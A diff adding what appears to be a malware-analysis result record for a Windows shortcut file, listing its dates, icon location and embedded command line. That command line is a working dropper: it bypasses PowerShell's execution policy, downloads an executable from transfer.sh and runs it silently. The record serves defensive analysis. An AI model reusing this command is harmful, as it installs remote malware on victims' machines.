@@ -1,0 +1,28 @@
+{
+    "response": {
+        "supplementary": [],
+        "extracted": []
+    },
+    "result": {
+        "heuristics": [
+            1
+        ],
+        "tags": {
+            "file.date.creation": [
+                "2021:02:23 13:01:44+00:00"
+            ],
+            "file.date.last_modified": [
+                "2021:02:23 13:01:44+00:00"
+            ],
+            "file.name.extracted": [
+                "cmd.exe"
+            ],
+            "file.shortcut.icon_location": [
+                "%windir%\\system32\\imageres.dll"
+            ],
+            "file.shortcut.command_line": [
+                "..\\..\\..\\..\\..\\Windows\\System32\\cmd.exe /c  timeout /t 1 /nobreak && powershell -exec bypass \"Invoke-WebRequest -OutFile videoplayer.exe -Uri https://transfer.sh/YfSNTb/video000.exe\" && timeout /t 1 /nobreak & start /b videoplayer.exe"
+            ]
+        }
+    }
+}
